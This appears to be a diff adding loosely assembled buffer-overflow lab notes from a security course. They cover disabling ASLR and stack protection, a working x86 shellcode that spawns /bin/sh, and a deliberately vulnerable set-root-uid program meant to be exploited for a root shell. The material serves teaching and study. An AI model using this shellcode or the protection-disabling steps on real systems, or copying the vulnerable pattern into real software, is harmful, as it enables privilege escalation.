@@ -1,0 +1,180 @@
+
+-fno-stack-protector -z execstack -mpreferred-stack-boundary=2
+
+###############################################################################
+cc -Wall -g -fno-stack-protector -c -o simple-shellcode.o simple-shellcode.c
+cc -z execstack simple-shellcode.o -o simple-shellcode
+
+The resulting binary module and executable are compiled for 32 bit, with executable stack (-z execstack option) 
+and no stack protector in order to allow execution of the exploit on the stack. Please ignore the gets warning: 
+gets must never be used but we do it here for the sake of demonstration. 
+
+###############################################################################
+In order to make everything easy, we disable ASLR (Address Space Layout Randomization), as instructed here:
+
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+or
+echo 0 > /proc/sys/kernel/randomize_va_space
+
+###############################################################################
+Address Space Randomization. Ubuntu and several other Linux-based systems uses address space randomization
+to randomize the starting address of heap and stack. This makes guessing the exact addresses
+difficult; guessing addresses is one of the critical steps of buffer-overflow attacks. In this lab, we disable
+these features using the following commands:
+$ su root
+Password: (enter root password)
+#sysctl -w kernel.randomize_va_space=0
+
+###############################################################################
+Open your /etc/sysctl.conf file:
+
+# sudo gedit /etc/sysctl.conf
+#### Add the following lines: 
+
+###enable ExecShield protection
+
+kernel.exec-shield = 1
+
+###enable random placement of virtual memory regions protection
+
+kernel.randomize_va_space = 1
+
+Save and close the file. 
+
+To load sysctl without reboot type this command below ::
+sysctl -p
+
+
+###############################################################################
+Non-Executable Stack. Ubuntu used to allow executable stacks, but this has now changed. In
+Ubuntu 11.04, the binary images of programs (and shared libraries) must declare whether they require
+executable stacks or not, i.e., they need to mark a field in the program header. Kernel or dynamic
+linker uses this marking to decide whether to make the stack of this running program executable or
+non-executable. This marking is done automatically by the recent versions of gcc, and by default, the
+stack is set to be non-executable. To change that, use the following option when compiling programs:
+
+For executable stack:
+$ gcc -z execstack -o test test.c
+
+For non-executable stack:
+$ gcc -z noexecstack -o test test.c
+
+###############################################################################
+The StackGuard Protection Scheme. The GCC compiler implements a security mechanism called ”Stack
+Guard” to prevent buffer overflows. In the presence of this protection, buffer overflow will not work. You
+can disable this protection when you are comiling the program using the switch -fno-stack-protector. For
+example, to compile a program example.c with Stack Guard disabled, you may use the following command:
+
+$ gcc -fno-stack-protector example.c
+###############################################################################
+Shellcode
+Before you start the attack, you need a shellcode. A shellcode is the code to launch a shell. It has to be
+loaded into the memory so that we can force the vulnerable program to jump to it. Consider the following
+program:
+
+#include <stdio.h>
+int main( ) {
+   char *name[2];
+   name[0] = ‘‘/bin/sh’’;
+   name[1] = NULL;
+   execve(name[0], name, NULL);
+}
+###############################################################################
+The shellcode that we use is just the assembly version of the above program. The following program
+shows you how to launch a shell by executing a shellcode stored in a buffer. Please compile and run the
+following code, and see whether a shell is invoked.
+
+/* call_shellcode.c  */
+
+/*A program that creates a file containing code for launching shell*/
+#include <stdlib.h>
+#include <stdio.h>
+
+const char code[] =
+  "\x31\xc0"             /* xorl    %eax,%eax              */
+  "\x50"                 /* pushl   %eax                   */
+  "\x68""//sh"           /* pushl   $0x68732f2f            */
+  "\x68""/bin"           /* pushl   $0x6e69622f            */
+  "\x89\xe3"             /* movl    %esp,%ebx              */
+  "\x50"                 /* pushl   %eax                   */
+  "\x53"                 /* pushl   %ebx                   */
+  "\x89\xe1"             /* movl    %esp,%ecx              */
+  "\x99"                 /* cdql                           */
+  "\xb0\x0b"             /* movb    $0x0b,%al              */
+  "\xcd\x80"             /* int     $0x80                  */
+;
+
+int main(int argc, char **argv)
+{
+   char buf[sizeof(code)];
+   strcpy(buf, code);
+   ((void(*)( ))buf)( );
+} 
+
+
+A few places in this shellcode are worth mentioning. First, the third instruction pushes “//sh”, rather
+than “/sh” into the stack. This is because we need a 32-bit number here, and “/sh” has only 24 bits. Fortunately,
+“//” is equivalent to “/”, so we can get away with a double slash symbol. Second, before calling the
+execve() system call, we need to store name[0] (the address of the string), name (the address of the
+array), and NULL to the %ebx, %ecx, and %edx registers, respectively. Line 5 stores name[0] to %ebx;
+Line 8 stores name to %ecx; Line 9 sets %edx to zero. There are other ways to set %edx to zero (e.g.,
+xorl %edx, %edx); the one (cdql) used here is simply a shorter instruction. Third, the system call
+execve() is called when we set %al to 11, and execute “int $0x80”.
+
+
+###############################################################################
+/* stack_new.c */
+
+/* This program has a buffer overflow vulnerability. */
+/* Our task is to exploit this vulnerability */
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+int bof(char *str)
+{
+    char buffer[12];
+
+    /* The following statement has a buffer overflow problem */ 
+    strcpy(buffer, str);
+
+    return 1;
+}
+
+int main(int argc, char **argv)
+{
+    char str[517];
+    FILE *badfile;
+
+    badfile = fopen("badfile", "r");
+    fread(str, sizeof(char), 517, badfile);
+    bof(str);
+
+    printf("Returned Properly\n");
+    return 1;
+}
+
+
+Compile the above vulnerable program and make it set-root-uid. You can achieve this by compiling it
+in the root account, and chmod the executable to 4755 (Note: if you are using our Ubuntu 11.04 VM,
+you should add "-z execstack" to the gcc command):
+
+$ su root
+Password (enter root password)
+# gcc -o stack -fno-stack-protector stack.c
+# chmod 4755 stack
+# exit
+
+The above program has a buffer overflow vulnerability. It first reads an input from a file called “badfile”,
+and then passes this input to another buffer in the function bof(). The original input can have a maximum
+length of 517 bytes, but the buffer in bof() has only 12 bytes long. Because strcpy() does not check
+boundaries, buffer overflow will occur. Since this program is a set-root-uid program, if a normal user can
+exploit this buffer overflow vulnerability, the normal user might be able to get a root shell. It should be
+noted that the program gets its input from a file called “badfile”. This file is under users’ control. Now, our
+objective is to create the contents for “badfile”, such that when the vulnerable program copies the contents
+into its buffer, a root shell can be spawned.
+
+###############################################################################
+###############################################################################
+http://ocw.cs.pub.ro/courses/cns/labs/lab-03
+###############################################################################
